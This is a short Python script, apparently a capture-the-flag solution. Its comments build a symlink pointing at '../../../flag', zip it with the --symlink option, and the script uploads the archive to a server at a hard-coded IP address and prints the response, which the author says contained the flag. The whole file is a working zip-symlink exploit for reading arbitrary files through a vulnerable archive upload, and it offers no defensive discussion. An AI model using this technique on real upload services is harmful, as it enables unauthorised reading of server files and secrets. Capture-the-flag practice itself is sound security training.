#touch hack
#ln -sfn ../../../flag hack
#zip konchan.zip hack --symlink
# i created symlink with connect with flag -> 
import requests
url="http://52.59.124.14:10015"
files = {'file': open('/home/hackervnn40/konchan.zip', 'rb')}
getdata = requests.post(url, files=files)
print(getdata.text)
# the res gave me a UwU flag
